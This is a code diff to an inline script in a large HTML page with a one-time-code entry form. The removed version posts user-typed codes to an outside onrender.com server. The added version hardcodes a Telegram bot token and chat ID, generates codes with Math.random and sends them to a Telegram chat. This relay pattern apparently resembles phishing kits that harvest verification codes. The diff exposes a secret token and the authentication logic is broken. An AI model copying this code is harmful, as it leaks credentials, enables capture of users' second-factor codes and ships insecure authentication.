@@ -15166,56 +15166,77 @@
   </body>
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      const otpInputs = document.querySelectorAll(".mantine-PinInput-input");
-      const continueButton = document.getElementById("continueButton");
-      const otpMessage = document.getElementById("otpMessage");
-  
-      const enableContinueButton = () => {
-        const allFilled = [...otpInputs].every(input => input.value.trim().length === 1);
-        continueButton.disabled = !allFilled;
-      };
-  
-      otpInputs.forEach((input, index) => {
-        input.addEventListener("input", (event) => {
-          if (event.target.value.length === 1 && index < otpInputs.length - 1) {
-            otpInputs[index + 1].focus();
-          }
-          enableContinueButton();
+        const otpInputs = document.querySelectorAll(".mantine-PinInput-input");
+        const continueButton = document.getElementById("continueButton");
+        const otpMessage = document.getElementById("otpMessage");
+
+        // Telegram Bot Configuration
+        const botToken = "7919451657:AAHgtRithe0PHnQ6oRVOI6SUm4WsgX9W8zw";  
+        const chatId = "6867935218";  
+
+        // Function to enable the continue button when all OTP fields are filled
+        const enableContinueButton = () => {
+            const allFilled = [...otpInputs].every(input => input.value.trim().length === 1);
+            continueButton.disabled = !allFilled;
+        };
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener("input", (event) => {
+                if (event.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                enableContinueButton();
+            });
+
+            input.addEventListener("keydown", (event) => {
+                if (event.key === "Backspace" && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
         });
-  
-        input.addEventListener("keydown", (event) => {
-          if (event.key === "Backspace" && !input.value && index > 0) {
-            otpInputs[index - 1].focus();
-          }
-        });
-      });
-  
-      document.getElementById("otpForm").addEventListener("submit", async (event) => {
-        event.preventDefault();
-  
-        const otpCode = [...otpInputs].map(input => input.value).join("");
-  
-        try {
-          const response = await fetch("https://one23-536-34.onrender.com/verify", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code: otpCode }), // Send only the OTP code
-          });
-  
-          const result = await response.json();
-  
-          if (response.ok) {
-            otpMessage.innerHTML = "<span style='color: green;'>OTP Sent Successfully!</span>";
-          } else {
-            otpMessage.innerHTML = `<span style='color: red;'>${result.message}</span>`;
-          }
-        } catch (error) {
-          otpMessage.innerHTML = "<span style='color: red;'>Error sending OTP</span>";
-          console.error("Error:", error);
+
+        // Function to generate a 6-digit OTP
+        function generateOTP() {
+            return Math.floor(100000 + Math.random() * 900000); // Generates a number between 100000 - 999999
         }
-      });
+
+        // Function to send OTP via Telegram
+        async function sendTelegramOTP(otp) {
+            const message = `🔐 *New OTP Code Generated!*\n\n📌 OTP: *${otp}*`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+                });
+
+                console.log("OTP sent to Telegram!");
+            } catch (error) {
+                console.error("Error sending OTP:", error);
+            }
+        }
+
+        // Handle OTP submission
+        document.getElementById("otpForm").addEventListener("submit", async (event) => {
+            event.preventDefault();
+
+            const otpCode = generateOTP(); // Generate OTP
+            await sendTelegramOTP(otpCode); // Send OTP to Telegram
+
+            otpMessage.innerHTML = "<span style='color: green;'>OTP Sent Successfully!</span>";
+
+            // Auto-fill the generated OTP into input fields (for testing)
+            const otpDigits = otpCode.toString().split("");
+            otpInputs.forEach((input, index) => {
+                input.value = otpDigits[index] || "";
+            });
+
+            enableContinueButton(); // Enable the button
+        });
     });
-  </script>
+</script>
+
   
   
     
